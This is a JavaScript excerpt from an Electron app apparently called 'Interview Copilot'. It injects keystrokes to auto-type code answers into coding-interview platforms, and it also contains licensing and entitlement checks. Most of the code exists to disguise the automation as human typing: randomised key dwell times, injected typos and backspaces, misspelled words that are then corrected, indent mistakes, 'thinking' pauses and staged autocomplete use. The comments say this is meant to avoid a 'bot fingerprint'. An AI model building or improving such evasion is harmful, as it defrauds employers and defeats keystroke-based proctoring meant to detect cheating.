async function releaseAllModifiers() {
  const nut = _nut;
  if (!nut || !nut.keyboard || !nut.Key) return;
  const names = [
    'LeftShift', 'RightShift',
    'LeftControl', 'RightControl',
    'LeftAlt', 'RightAlt',
    'LeftSuper', 'RightSuper',
  ];
  for (const name of names) {
    const k = nut.Key[name];
    if (k === undefined || k === null) continue;
    try { await nut.keyboard.releaseKey(k); } catch (_) { /* best effort */ }
  }
}

// Press a single keystroke with sampled dwell. Used for one-off keys like
// Backspace, Enter, Tab, arrows, etc — anywhere we'd previously do
// `pressKey(K); releaseKey(K);` back-to-back (0ms dwell — the bot fingerprint).
async function autoTypePressWithDwell(keyboard, key) {
  const d = autoTypeLogNormal(85, 0.30);
  const dwell = Math.max(30, Math.min(180, Math.round(d)));
  await withHeldKey(keyboard, key, async () => {
    await autoTypeSleep(dwell);
  });
}

// Type a single CHARACTER (letter/digit/punctuation) with real dwell time.
// Looks up the key in _AT_CHAR_KEY_MAP; for shifted chars (capitals, !@#,
// etc), holds LeftShift across the press/release pair. Falls back to
// keyboard.type() for chars not in the map (unicode, accented letters, etc) —
// those lose dwell but the typing still works.
async function typeCharHumanly(keyboard, Key, ch) {
  const mapping = _AT_CHAR_KEY_MAP[ch];
  if (!mapping || !Key[mapping.name]) {
    // Unmapped char — fallback to keyboard.type (loses dwell but works).
    try { await keyboard.type(ch); }
    catch (e) { console.warn('[auto-type] typeCharHumanly fallback failed for', JSON.stringify(ch), ':', e && e.message); }
    return;
  }
  const keyObj = Key[mapping.name];
  const dwell = autoTypeSampleDwell(ch);
  try {
    if (mapping.shift) {
      // Press Shift, brief settle (real Shift hold overlaps key press),
      // then press the key with dwell, release key, release Shift.
      // Both holds go through withHeldKey: the inner finally runs before
      // the outer one, and BOTH run before the catch below — which matters
      // enormously here, because that catch calls keyboard.type(ch) and it
      // used to do so with Shift still held.
      await withHeldKey(keyboard, Key.LeftShift, async () => {
        await autoTypeSleep(12 + Math.random() * 18);
        await withHeldKey(keyboard, keyObj, async () => {
          await autoTypeSleep(dwell);
        });
        await autoTypeSleep(6 + Math.random() * 14);
      });
    } else {
      await withHeldKey(keyboard, keyObj, async () => {
        await autoTypeSleep(dwell);
      });
    }
  } catch (e) {
    console.warn('[auto-type] typeCharHumanly manual press failed for', JSON.stringify(ch), ':', e && e.message);
    // Last-resort: try keyboard.type so we don't drop the character entirely.
    try { await keyboard.type(ch); } catch (_) {}
  }
}

let _atLastWasTypo = false;
// Per-run autocomplete attempt counter. Capped so a single Auto-Type run
// can't add 6+ autocomplete-look pauses (~600ms each = 3.6s wasted) even
// if UIA is flaky and most attempts skip Tab. Reset in autoTypeResetCadence.
let _atAutocompleteAttempts = 0;
const AT_AUTOCOMPLETE_MAX_PER_RUN = 3;

// Type a single char, sometimes mis-typing + backspacing first.
// ~0.8% per eligible char. Skipped if the previous char was also a typo
// (avoid stacked mistakes) or if prevCh is an auto-close trigger (IDEs
// may intercept the backspace to re-open a closed bracket/quote).
// Kill-switch: DISABLE_AUTO_TYPE_MISTAKES=1 bypasses injection entirely.
async function autoTypeCharWithTypo(keyboard, Key, ch, prevCh) {
  if (process.env.DISABLE_AUTO_TYPE_MISTAKES === '1') {
    _atLastWasTypo = false;
    await typeCharHumanly(keyboard, Key, ch);
    return;
  }
  const isLetter = /^[a-zA-Z]$/.test(ch);
  const prevIsAutoClose = prevCh && /[([{<"'`]/.test(prevCh);
  const eligible = isLetter && !_atLastWasTypo && !prevIsAutoClose;
  let didTypo = false;

  // ── P3a: Raised error rate (was ~0.8% single-char, now ~3.2% combined) ──
  // Real human correction rate is 5.9-6.5% per keystroke (Dhakal 136M).
  // Three injection sites: extra-space (0.4%) + double-typo (0.3%) + bumped
  // single-typo (2.5%). Plus word-backtrack (~0.4%) and indent-mistake
  // (~1.2% per indent) → combined ~5%, close to human baseline.
  // ── P1a integration: all typing here uses typeCharHumanly (real dwell)
  // and backspaces use autoTypePressWithDwell (no zero-dwell key events).

  // ── Extra-space typo (~0.4%) ──
  if (eligible && Math.random() < 0.004) {
    try {
      await typeCharHumanly(keyboard, Key, ' ');
      await autoTypeSleep(150 + Math.random() * 200);
      await autoTypePressWithDwell(keyboard, Key.Backspace);
      await autoTypeSleep(80 + Math.random() * 120);
      didTypo = true;
    } catch (e) {
      console.warn('[auto-type] extra-space typo failed:', e && e.message);
    }
  }

  // ── Double-typo (~0.3%) ──
  if (!didTypo && eligible && Math.random() < 0.003) {
    const wrong1 = autoTypePickTypoChar(ch);
    if (wrong1) {
      try {
        await typeCharHumanly(keyboard, Key, wrong1);
        await autoTypeSleep(80 + Math.random() * 120);
        const wrong2 = autoTypePickTypoChar(ch);
        if (wrong2) {
          await typeCharHumanly(keyboard, Key, wrong2);
          await autoTypeSleep(350 + Math.random() * 600);
          await autoTypePressWithDwell(keyboard, Key.Backspace);
          await autoTypeSleep(60 + Math.random() * 80);
        } else {
          await autoTypeSleep(250 + Math.random() * 500);
        }
        await autoTypePressWithDwell(keyboard, Key.Backspace);
        await autoTypeSleep(100 + Math.random() * 130);
        didTypo = true;
      } catch (e) {
        console.warn('[auto-type] double-typo failed:', e && e.message);
      }
    }
  }

  // ── Single-char typo (bumped from 0.008 → 0.025) ──
  if (!didTypo && eligible && Math.random() < 0.025) {
    const wrong = autoTypePickTypoChar(ch);
    if (wrong) {
      let wrongTyped = false;
      try { await typeCharHumanly(keyboard, Key, wrong); wrongTyped = true; }
      catch (e) { console.warn('[auto-type] typo wrong-char failed:', e.message); }
      if (wrongTyped) {
        await autoTypeSleep(250 + Math.random() * 500);
        try {
          await autoTypePressWithDwell(keyboard, Key.Backspace);
        } catch (e) { console.warn('[auto-type] typo backspace failed:', e.message); }
        await autoTypeSleep(100 + Math.random() * 120);
        didTypo = true;
      }
    }
  }

  _atLastWasTypo = didTypo;
  await typeCharHumanly(keyboard, Key, ch);
}

// ───────────────────────────────────────────────
//  REALISM UPGRADES — decision-point pauses, word-level backtrack,
//  indent mistakes. All operate at a much lower rate than the char-level
//  typo (those keep per-char realism; these add "thought" texture).
// ───────────────────────────────────────────────

// Returns extra milliseconds to pause BEFORE typing `ch`, based on what
// `prevCh` was. Humans pause at decision points — opening groups, assignment,
// end-of-signature colons — to think about what comes next. These fire
// probabilistically so they cluster naturally rather than showing up at every
// matching character.
function autoTypeDecisionPause(ch, prevCh) {
  if (!prevCh) return 0;

  // Opening a call / indexer after an identifier-ish char: what args go here?
  if ((ch === '(' || ch === '[') && /[a-zA-Z0-9_)\]]/.test(prevCh)) {
    if (Math.random() < 0.55) return 140 + Math.random() * 300;
  }

  // Assignment: pause to think about the right-hand side.
  // Exclude compound operators so `==`, `!=`, `<=`, `>=`, `+=`, etc. don't trigger.
  if (ch === '=' && '=!<>+-*/%'.indexOf(prevCh) === -1) {
    if (Math.random() < 0.35) return 150 + Math.random() * 280;
  }

  // Colon ending a block signature (def/class/if/for/...).
  if (ch === ':' && /[a-zA-Z0-9_)\]]/.test(prevCh)) {
    if (Math.random() < 0.28) return 110 + Math.random() * 220;
  }

  return 0;
}

// Word-level backtrack: type a plausible misspelling of a whole identifier,
// pause as if realizing, backspace it, retype correctly. Fires rarely (~0.4%
// per eligible word). Applied only to alphanumeric identifiers of reasonable
// length — skipping it on short or non-identifier tokens keeps the cadence
// believable.
//
// Contract: returns true ONLY when the full wrong-type + backspace +
// correct-type sequence ran to completion. On abort or keyboard error at any
// phase, cleans up what was typed and returns false — caller then either
// exits via its own abort check or falls through to char-by-char typing.
// Kill-switch: DISABLE_AUTO_TYPE_MISTAKES=1 short-circuits to false.
async function autoTypeMaybeBacktrackWord(keyboard, Key, word) {
  if (process.env.DISABLE_AUTO_TYPE_MISTAKES === '1') return false;
  if (!word || word.length < 4 || word.length > 14) return false;
  if (!/^[a-zA-Z_][a-zA-Z_0-9]*$/.test(word)) return false;
  if (Math.random() > 0.004) return false;

  // Generate a plausible misspelling: transpose two middle letters. Skip if
  // the transposition produces the same word (e.g. doubled letters).
  const mid = Math.floor(word.length / 2);
  if (mid < 1 || mid >= word.length) return false;
  const wrong = word.slice(0, mid - 1) + word[mid] + word[mid - 1] + word.slice(mid + 1);
  if (wrong === word) return false;

  // Best-effort cleanup: backspace `n` chars with real dwell on each.
  const reverse = async (n) => {
    for (let k = 0; k < n; k++) {
      try {
        await autoTypePressWithDwell(keyboard, Key.Backspace);
      } catch (e) {
        console.warn('[auto-type] backtrack reverse failed:', e.message);
        return;
      }
      await autoTypeSleep(25);
    }
  };

  // Phase 1: type wrong word. Any abort/error = reverse + return false.
  let wp = null;
  let wrongTyped = 0;
  for (const ch of wrong) {
    if (autoTypeAbort) { await reverse(wrongTyped); return false; }
    try { await typeCharHumanly(keyboard, Key, ch); wrongTyped++; }
    catch (e) {
      console.warn('[auto-type] backtrack wrong-char failed:', e.message);
      await reverse(wrongTyped);
      return false;
    }
    await autoTypeSleep(autoTypeHumanDelay(ch, wp));
    wp = ch;
  }

  // "Realize" — noticeable pause before the correction.
  await autoTypeSleep(320 + Math.random() * 420);

  // Phase 2: backspace wrong word with real dwell on each Backspace.
  let backspaced = 0;
  for (let i = 0; i < wrong.length; i++) {
    if (autoTypeAbort) { await reverse(wrongTyped - backspaced); return false; }
    try {
      await autoTypePressWithDwell(keyboard, Key.Backspace);
      backspaced++;
    } catch (e) {
      console.warn('[auto-type] backtrack backspace failed:', e.message);
      await reverse(wrongTyped - backspaced);
      return false;
    }
    await autoTypeSleep(32 + Math.random() * 38);
  }

  // Phase 3: type correct word with dwell. On abort/error, back out
  // partial correct so caller retypes from scratch.
  await autoTypeSleep(110 + Math.random() * 180);
  let cp = null;
  let correctTyped = 0;
  for (const ch of word) {
    if (autoTypeAbort) { await reverse(correctTyped); return false; }
    try { await typeCharHumanly(keyboard, Key, ch); correctTyped++; }
    catch (e) {
      console.warn('[auto-type] backtrack correct-char failed:', e.message);
      await reverse(correctTyped);
      return false;
    }
    await autoTypeSleep(autoTypeHumanDelay(ch, cp));
    cp = ch;
  }

  // Suppress single-char typos for the next couple chars — stacked mistakes
  // look contrived.
  _atLastWasTypo = true;
  return true;
}

// ── P5b: Autocomplete acceptance via Tab (with Tab+Escape recovery) ──
//
// Real coders press Tab to accept IDE autocomplete on ~30% of identifiers
// (Copilot studies: 29.8% Python / 27.5% JS / 26.9% TS). We do the same:
// type partial → pause → Tab → verify → recover safely.
//
// CRITICAL DESIGN POINT — recovery strategy (revised after a regression
// where the naive "backspace 1 + retype" produced duplicate chars like
// "Scannerner" when Tab actually triggered autocomplete):
//
//   1. **Pre-flight UIA check** — if UIA is unreliable BEFORE pressing
//      Tab, abort the autocomplete attempt entirely (skip Tab, type rest
//      manually). Pressing Tab without a reliable post-verify is the
//      root of the corruption.
//
//   2. **Tab + Escape pair** — press Tab, brief sleep, then press Escape.
//      Escape DISMISSES any open autocomplete dropdown WITHOUT undoing
//      already-committed text. This stabilizes the editor's accessibility
//      tree so the post-Tab UIA read is reliable.
//
//   3. **Verified recovery** — after the long settle, UIA-read again.
//      Compute exact `insertDelta` (cursorAfter - cursorBefore). Three
//      possible outcomes, each with a SAFE recovery:
//        • insertDelta === remaining.length AND inserted text matches our
//          intended `remaining` → autocomplete worked, done.
//        • insertDelta === 1 → Tab inserted a literal tab char → backspace
//          1, type rest manually.
//        • Other → backspace `insertDelta` chars, type rest manually.
//      All three paths produce CORRECT editor state — no duplicate-char bug.
//
//   4. **Final fallback (still-flaky UIA)** — if UIA fails even after the
//      Tab+Escape settle, do nothing risky: type the rest manually WITHOUT
//      backspacing. May produce a stray tab char if Tab inserted literal
//      tab, but the post-typing verify+correct (P5c) sees the wrong tail
//      length and can append/adjust. Better a fixable trailing artifact
//      than a duplicate-char corruption mid-identifier.
//
// Kill-switch: DISABLE_AUTO_TYPE_MISTAKES=1 disables.
async function autoTypeMaybeAutocomplete(keyboard, Key, word, prevCh) {
  if (process.env.DISABLE_AUTO_TYPE_MISTAKES === '1') return false;
  if (!word || word.length < 6) return false;
  if (!/^[a-zA-Z_][a-zA-Z_0-9]*$/.test(word)) return false;
  // Cap per-run attempts. Each attempt adds 600-1000ms of pause regardless
  // of whether Tab succeeds. Without this cap, a code block with many long
  // identifiers stacks up multiple seconds of pure pause and starts feeling
  // like the auto-typer is hung.
  if (_atAutocompleteAttempts >= AT_AUTOCOMPLETE_MAX_PER_RUN) return false;
  if (Math.random() > 0.22) return false;
  _atAutocompleteAttempts++;

  // Type first N chars (3-5)
  const N = Math.min(word.length - 1, 3 + Math.floor(Math.random() * 3));
  let curPrev = prevCh;
  for (let k = 0; k < N; k++) {
    if (autoTypeAbort) return false;
    const cN = word[k];
    try { await autoTypeCharWithTypo(keyboard, Key, cN, curPrev); }
    catch (_) { return false; }
    await autoTypeSleep(autoTypeHumanDelay(cN, curPrev));
    curPrev = cN;
  }

  const remaining = word.slice(N);

  // "Looking at dropdown" pause — biometric signal, also gives UIA time
  // to settle after the burst of N chars we just typed.
  await autoTypeSleep(280 + Math.random() * 380);

  // STEP 1: Pre-flight UIA check. If UIA is broken right now (mid-typing
  // accessibility-tree churn), skip Tab entirely — type rest as plain
  // chars. The biometric signature (mid-identifier pause) is preserved.
  const beforeTab = await readFocusedViaUIA(600);
  if (!beforeTab || !beforeTab.ok || typeof beforeTab.cursorOffset !== 'number') {
    for (let k = 0; k < remaining.length; k++) {
      if (autoTypeAbort) return false;
      const cN = remaining[k];
      try { await autoTypeCharWithTypo(keyboard, Key, cN, curPrev); }
      catch (_) { return false; }
      await autoTypeSleep(autoTypeHumanDelay(cN, curPrev));
      curPrev = cN;
    }
    console.log(`[auto-type] autocomplete "${word}": pre-Tab UIA unreliable — skipped Tab, typed rest manually (pattern preserved)`);
    return true;
  }
  const cursorBefore = beforeTab.cursorOffset;

  // STEP 2: Tab + Escape. Tab attempts autocomplete; Escape dismisses any
  // resulting dropdown without affecting committed text. This stabilizes
  // the editor accessibility tree for the post-Tab UIA read.
  try {
    await autoTypePressWithDwell(keyboard, Key.Tab);
    await autoTypeSleep(60 + Math.random() * 100);
    await autoTypePressWithDwell(keyboard, Key.Escape);
  } catch (_) { return false; }
  await autoTypeSleep(240 + Math.random() * 260);  // long settle post-Escape

  // STEP 3: Verified recovery.
  const after = await readFocusedViaUIA(1200);

  // STEP 4 (fallback): Still-flaky UIA. Don't backspace — type rest as is.
  // Better to leave a fixable trailing stray than a mid-identifier dup-char.
  if (!after || !after.ok || typeof after.text !== 'string') {
    for (let k = 0; k < remaining.length; k++) {
      if (autoTypeAbort) return false;
      const cN = remaining[k];
      try { await autoTypeCharWithTypo(keyboard, Key, cN, curPrev); }
      catch (_) { return false; }
      await autoTypeSleep(autoTypeHumanDelay(cN, curPrev));
      curPrev = cN;
    }
    console.log(`[auto-type] autocomplete "${word}": post-Tab+Esc UIA still failing — typed rest (no backspace to avoid dup-char corruption)`);
    return true;
  }

  const cursorAfter = after.cursorOffset || 0;
  const insertDelta = cursorAfter - cursorBefore;

  // STEP 3a: Tab triggered autocomplete and inserted exactly what we wanted.
  if (insertDelta === remaining.length) {
    const inserted = after.text.slice(cursorBefore, cursorAfter);
    if (inserted === remaining) {
      console.log(`[auto-type] autocomplete ACCEPTED "${word}" via Tab (saved ${remaining.length} keystrokes)`);
      return true;
    }
  }

  // STEP 3b: Tab inserted a literal tab char (delta = 1, autocomplete didn't fire).
  if (insertDelta === 1) {
    try { await autoTypePressWithDwell(keyboard, Key.Backspace); } catch (_) {}
    await autoTypeSleep(40 + Math.random() * 50);
    for (let k = 0; k < remaining.length; k++) {
      if (autoTypeAbort) return false;
      const cN = remaining[k];
      try { await autoTypeCharWithTypo(keyboard, Key, cN, curPrev); }
      catch (_) { return false; }
      await autoTypeSleep(autoTypeHumanDelay(cN, curPrev));
      curPrev = cN;
    }
    console.log(`[auto-type] autocomplete "${word}": Tab inserted literal tab (no dropdown was open) — backspaced + typed rest`);
    return true;
  }

  // STEP 3c: Tab did something unexpected. Backspace exactly the chars it
  // inserted (we KNOW insertDelta now), then retype manually.
  const toBackspace = Math.max(0, Math.min(insertDelta, 60));
  for (let k = 0; k < toBackspace; k++) {
    if (autoTypeAbort) return false;
    try { await autoTypePressWithDwell(keyboard, Key.Backspace); } catch (_) {}
    await autoTypeSleep(28 + Math.random() * 38);
  }
  for (let k = 0; k < remaining.length; k++) {
    if (autoTypeAbort) return false;
    const cN = remaining[k];
    try { await autoTypeCharWithTypo(keyboard, Key, cN, curPrev); }
    catch (_) { return false; }
    await autoTypeSleep(autoTypeHumanDelay(cN, curPrev));
    curPrev = cN;
  }
  console.log(`[auto-type] autocomplete "${word}": Tab inserted ${insertDelta} unexpected chars — backspaced + retyped`);
  return true;
}

// Indent mistake at the start of a fresh block: type fewer spaces than
// intended, pause, realize, backspace, get it right. Only fires when the
// previous line ended with a block-opener (`:` in Python, `{` in C-family)
// AND the current line has a substantive indent. Low rate (~1.2%).
// Kill-switch: DISABLE_AUTO_TYPE_MISTAKES=1 short-circuits to false.
async function autoTypeMaybeIndentMistake(keyboard, Key, intendedIndentSpaces, prevLineEndsWithBlockOpen) {
  if (process.env.DISABLE_AUTO_TYPE_MISTAKES === '1') return false;
  if (!prevLineEndsWithBlockOpen) return false;
  if (intendedIndentSpaces < 4) return false;
  if (Math.random() > 0.012) return false;

  // Type intendedIndent - 2..4 spaces (a common "not indented enough" mistake).
  const shortBy = 2 + Math.floor(Math.random() * 3);
  const wrongCount = Math.max(2, intendedIndentSpaces - shortBy);

  const reverse = async (n) => {
    for (let k = 0; k < n; k++) {
      try {
        await autoTypePressWithDwell(keyboard, Key.Backspace);
      } catch (e) {
        console.warn('[auto-type] indent reverse failed:', e.message);
        return;
      }
      await autoTypeSleep(22);
    }
  };

  // Phase 1: type short indent (spaces with dwell). Abort/error = reverse + return false.
  let typed = 0;
  for (let i = 0; i < wrongCount; i++) {
    if (autoTypeAbort) { await reverse(typed); return false; }
    try { await typeCharHumanly(keyboard, Key, ' '); typed++; }
    catch (e) {
      console.warn('[auto-type] indent short-space failed:', e.message);
      await reverse(typed);
      return false;
    }
    await autoTypeSleep(38 + Math.random() * 40);
  }

  await autoTypeSleep(280 + Math.random() * 380);

  // Phase 2: backspace short indent. Abort/error = reverse remaining + return false.
  let erased = 0;
  for (let i = 0; i < wrongCount; i++) {
    if (autoTypeAbort) { await reverse(typed - erased); return false; }
    try {
      await autoTypePressWithDwell(keyboard, Key.Backspace);
      erased++;
    } catch (e) {
      console.warn('[auto-type] indent backspace failed:', e.message);
      await reverse(typed - erased);
      return false;
    }
    await autoTypeSleep(28 + Math.random() * 36);
  }

  await autoTypeSleep(90 + Math.random() * 160);
  return true;
}

let autoTypeAbort = false;
let autoTypeInFlight = false;
// P8-1: ID of the CodeBlock that triggered the current Auto-Type cycle.
// Tagged into every auto-type:status broadcast so other CodeBlocks (popout,
// prior messages) can ignore events they don't own. Without this, broadcasts
// hit every mounted CodeBlock and they ALL visibly transition through
// countdown / typing / done — the "Auto Type shows on the 1st chunk" bug.
let _atCurrentBlockId = null;
// Reason for the most recent abort. Tracked alongside autoTypeAbort so the
// finally-block 'done' broadcast can tell the renderer WHY we stopped — the
// renderer used to silently reset to idle on aborted=true with no toast,
// leaving the user staring at a button that just gave up. Possible values:
// 'user_abort', 'sid_drift_during_typing', 'no_target_editor',
// 'native_module_load_failed', 'permission_denied', null.
let autoTypeAbortReason = null;
// Companion diagnostic blob (expected/actual snippets, line index, hint).
// Populated when SID fires; renderer pulls it into the multi-line toast.
let autoTypeAbortDiagnostic = null;

// Run id of the in-flight auto-type, so the broadcast chokepoint below can
// persist verify outcomes without every branch having to remember to.
let autoTypeCurrentRunId = null;

// Broadcast progress so the clicked CodeBlock can update its button label.
// P8-1: tag every broadcast with the owning blockId so non-owners ignore it.
function autoTypeBroadcast(data) {
  const tagged = (data && typeof data === 'object' && _atCurrentBlockId)
    ? { ...data, blockId: _atCurrentBlockId }
    : data;
  // Persist the verify outcome. autoTypePlanLog documents a `verify` field
  // but nothing wrote it, so every recorded run showed a before and an
  // after with no verdict attached. Recording HERE rather than in each of
  // the eight verify branches means a new branch can't silently skip it.
  if (autoTypeCurrentRunId && data && (data.phase === 'verify-ok' || data.phase === 'verify-mismatch')) {
    try {
      autoTypePlanLog.record(autoTypeCurrentRunId, {
        verify: {
          ok: data.phase === 'verify-ok',
          reason: data.reason || null,
          ...(data.repairs !== undefined ? { repairs: data.repairs } : {}),
          ...(data.missing !== undefined ? { missing: data.missing } : {}),
        },
      });
    } catch (_) { /* logging must never break a run */ }
  }
  BrowserWindow.getAllWindows().forEach(win => {
    if (!win.isDestroyed()) win.webContents.send('auto-type:status', tagged);
  });
}

ipcMain.handle('auto-type:check-permission', () => {
  if (process.platform !== 'darwin') return { ok: true };
  try {
    const { systemPreferences } = require('electron');
    // prompt: true triggers macOS's native Accessibility dialog on first call.
    // Grant takes effect only after app restart — there's no API workaround.
    const granted = systemPreferences.isTrustedAccessibilityClient(true);
    if (granted) return { ok: true };
    return {
      ok: false,
      message: 'Interview Copilot needs Accessibility permission to auto-type into coding platforms.\n\n1. Open System Settings → Privacy & Security → Accessibility\n2. Enable Interview Copilot\n3. Quit and restart the app\n\nWithout this, keystrokes cannot reach the focused editor.'
    };
  } catch (e) {
    return { ok: false, message: 'Could not check Accessibility permission: ' + (e && e.message) };
  }
});

ipcMain.on('auto-type:abort', () => {
  if (autoTypeInFlight) {
    autoTypeAbort = true;
    autoTypeAbortReason = 'user_abort';
    // P8.5: wake any in-flight sleeps so the typing loop's abort checks
    // fire immediately instead of waiting out a P-burst / tool-switch pause.
    autoTypeFireAbortSignal();
  }
});

// ───────────────────────────────────────────────
//  Auto-Type hardening — who may ask, how much, and whether they paid
//
//  Everything below exists because 'auto-type:send' is not really an IPC
//  message, it is an OS-wide keystroke-injection primitive with a preload
//  allowlist entry in front of it. It types into whatever window the OS
//  has focused — a terminal, an SSH session, a password manager — after
//  hiding our own window so the user is looking at the target. Three
//  things were missing: nobody checked WHO asked, nobody checked HOW MUCH
//  they asked for, and the "this is an Ultra feature" gate lived entirely
//  in localStorage, where a text editor is a valid unlock tool.
// ───────────────────────────────────────────────

// A generous but finite ceiling on payload.code. A 500-line source file is
// roughly 15 KB, so 100 KB is far past any real interview answer — the
// point is only that the number exists. An unbounded string here is an
// unbounded keystroke stream, and the user cannot type faster than it.
const AT_MAX_CODE_BYTES = 100 * 1024;

// How long a server-proven entitlement stays good with no further contact.
// Interviews happen on hotel wifi and on monitored corporate networks where
// Local-Only mode suppresses outbound calls on purpose, so "must be online
// every time" would break the feature for the people who paid for it. Seven
// days is the compromise: one online run buys a week of offline runs.
const AT_ENTITLEMENT_GRACE_MS = 7 * 24 * 60 * 60 * 1000;
// The probe is fired in parallel with the 3s countdown, so anything under
// ~3s is invisible to the user. Past that we stop waiting and fall back to
// the cached grant (or refuse, if there isn't one).
const AT_ENTITLEMENT_PROBE_TIMEOUT_MS = 6000;

// ── Who may ask ──
// The invoke must come from the TOP frame of a window WE own. Two separate
// questions, both of which have to be yes:
//   1. is the WebContents one of ours (main window or popout)? — this is
//      what stops any other WebContents we might open later (an OAuth
//      window, a docs viewer, a future embedded browser) from reaching the
//      keyboard just because it happens to share a preload;
//   2. is the sending frame the top frame? — a subframe is embedded content
//      we did not author (an iframe, an ad, an embedded doc), and embedded
//      content must never be able to type into the user's terminal.
// senderFrame can legitimately be null (the frame navigated or died between
// the send and our handler), and touching a destroyed WebFrameMain throws —
// both cases resolve to "not trusted", which is the safe direction.
function autoTypeSenderIsTrusted(event) {
  try {
    const sender = event && event.sender;
    if (!sender || sender.isDestroyed()) return false;
    const ownsSender =
      (mainWindow && !mainWindow.isDestroyed() && sender === mainWindow.webContents) ||
      (popoutWindow && !popoutWindow.isDestroyed() && sender === popoutWindow.webContents);
    if (!ownsSender) return false;
    const frame = event.senderFrame;
    if (!frame) return false;
    // `parent` is null for a top-level frame. `top` is the belt to that
    // suspenders — it exists on WebFrameMain in this Electron line, but we
    // only assert on it when it's actually there so a future API shift
    // degrades to the parent check rather than to "deny everything".
    if (frame.parent) return false;
    if (frame.top && frame.top !== frame) return false;
    return true;
  } catch (_) {
    // Destroyed frame, revoked object, anything at all — deny.
    return false;
  }
}

// ── Did they pay? ──
// The renderer is no longer believed about tier. gates.autoType comes from
// JSON.parse(localStorage['minicaai_license']) and user.is_admin from the
// same blob flips the effective tier to 'ultra' outright, so the client-side
// gate is decoration. The ONE real gate in the system is server-side:
// /api/v1/ai/autotype-plan is mounted behind requireTier('ultra'). We reuse
// it as an entitlement probe rather than inventing a new endpoint — and we
// POST a body with NO `code` field on purpose, so the tier middleware runs
// (that is the entire thing we want) and the route itself bails at its own
// `code is required` 400 before spending a Haiku call. What we learn:
//
//   401 / 402 / 403 → the server said NO. Abort the run, type nothing.
//                     This is the line that matters: main.cjs used to treat
//                     ANY non-OK planner response as "fine, use the
//                     deterministic fallback" and typed anyway, so a 403
//                     from the only real gate in the product was a
//                     no-op.
//   2xx / 400 / 422 → the tier middleware PASSED (a 400 can only come from
//                     the handler, which runs after it). Entitlement proven.
//   404 / 5xx / net → we learned nothing. NOT a denial — an old server, a
//                     cold start, or airport wifi must not look like fraud.
//
// A proven entitlement is cached under userData. We never cache a denial as
// an allow, and an explicit tier denial DELETES the cached allow so a grace
// window can't outlive a cancelled subscription.
function autoTypeEntitlementFile() {
  return path.join(app.getPath('userData'), 'autotype-entitlement.json');
}

// Cache key: the user id out of the JWT when we can read one, otherwise a
// fingerprint of the token itself. The JWT is NOT verified here and does not
// need to be — this is a lookup key, not a credential. A forged key can only
// ever find an entry that a real server grant wrote for that same id on this
// same machine. Preferring the id over the raw token means the cache
// survives token rotation (/license/validate rotates tokens every ~30 min),
// which is exactly the user who is entitled and about to go offline.
function autoTypeIdentityKey(authToken) {
  if (!authToken) return null;
  try {
    const seg = String(authToken).split('.')[1];
    if (seg) {
      const json = JSON.parse(Buffer.from(seg.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'));
      const id = json && (json.id != null ? json.id : (json.sub != null ? json.sub : json.userId));
      if (id != null && String(id).length) return `u:${String(id)}`;
    }
  } catch (_) { /* not a JWT — fall through to the fingerprint */ }
  try {
    return 't:' + require('crypto').createHash('sha256').update(String(authToken)).digest('hex').slice(0, 16);
  } catch (_) {
    return null;
  }
}

function autoTypeReadEntitlementCache() {
  try {
    const raw = fs.readFileSync(autoTypeEntitlementFile(), 'utf8');
    const parsed = JSON.parse(raw);
    if (parsed && typeof parsed === 'object' && parsed.entries && typeof parsed.entries === 'object') return parsed;
  } catch (_) { /* missing or corrupt — treated as "never verified" */ }
  return { v: 1, entries: {} };
}

// Returns { ageMs } for a still-valid grant, or null. A null key means we
// have no token to key on (signed out, or an old renderer): in that case any
// fresh grant on this machine counts. That is deliberate — the grant proves
// "this installation was verified Ultra recently", which is the property we
// actually care about, and it keeps a user whose token vanished from being
// locked out mid-interview.
function autoTypeCachedEntitlement(key) {
  const cache = autoTypeReadEntitlementCache();
  const now = Date.now();
  const fresh = (e) => e && e.ok === true && typeof e.at === 'number' && (now - e.at) >= 0 && (now - e.at) < AT_ENTITLEMENT_GRACE_MS;
  if (key) {
    const entry = cache.entries[key];
    return fresh(entry) ? { ageMs: now - entry.at, key } : null;
  }
  for (const [k, entry] of Object.entries(cache.entries)) {
    if (fresh(entry)) return { ageMs: now - entry.at, key: k };
  }
  return null;
}

function autoTypeRememberEntitlement(key) {
  if (!key) return;
  try {
    const cache = autoTypeReadEntitlementCache();
    cache.entries[key] = { ok: true, at: Date.now() };
    // Bound the file. Nobody signs into more than a handful of accounts on
    // one machine, and an unbounded map here would be a slow disk leak.
    const keys = Object.keys(cache.entries);
    if (keys.length > 8) {
      keys.sort((a, b) => (cache.entries[a].at || 0) - (cache.entries[b].at || 0));
      for (const k of keys.slice(0, keys.length - 8)) delete cache.entries[k];
    }
    fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
  } catch (e) {
    // Best-effort. A machine that can't write here just re-verifies online
    // every run, which is inconvenient, never unsafe.
    console.warn('[auto-type] could not persist entitlement:', e && e.message);
  }
}

function autoTypeForgetEntitlement(key) {
  if (!key) return;
  try {
    const cache = autoTypeReadEntitlementCache();
    if (cache.entries[key]) {
      delete cache.entries[key];
      fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
    }
  } catch (_) { /* best-effort */ }
}

// ───────────────────────────────────────────────
//  The SIGNED claim — a grant we can verify but cannot mint
//
//  Everything above this line is honest bookkeeping, not proof. The cached
//  grant is {ok:true, at:<ms>} in a JSON file under the user's own userData
//  directory, which means "have I paid?" was answerable with a text editor
//  and the seven-day grace window was a seven-day hole. The server now hands
//  back the same verdict as an Ed25519-signed claim from
//  GET /api/v1/license/entitlements, and this is the half that checks it.
//
//  Why ASYMMETRIC: the desktop app must be able to VERIFY a claim without
//  being able to MINT one. An HMAC needs the same secret on both ends, and a
//  secret compiled into a binary that runs on the attacker's machine is not
//  a secret — it is one `strings` away from being an Ultra key generator.
//  With Ed25519 the private half never leaves the server env and the worst
//  anyone can do with the constant below is check somebody else's claim,
//  which is why it is safe to ship in plain sight.
// ───────────────────────────────────────────────
const AT_ENTITLEMENT_PUBLIC_KEY_B64 = 'MCowBQYDK2VwAyEA1I54O1cf6oxYxxuRVrFORRb0NZzchmPtodRI4Llqc/Y=';

// undefined = not parsed yet, null = parsed and unusable. Lazy + memoized
// for the same reason the server parses its half lazily: a bad constant must
// degrade to "no signed claims, use the probe", never to a throw on the
// module's load path.
let _atClaimPublicKey;
function autoTypeClaimPublicKey() {
  if (_atClaimPublicKey !== undefined) return _atClaimPublicKey;
  try {
    const key = require('crypto').createPublicKey({
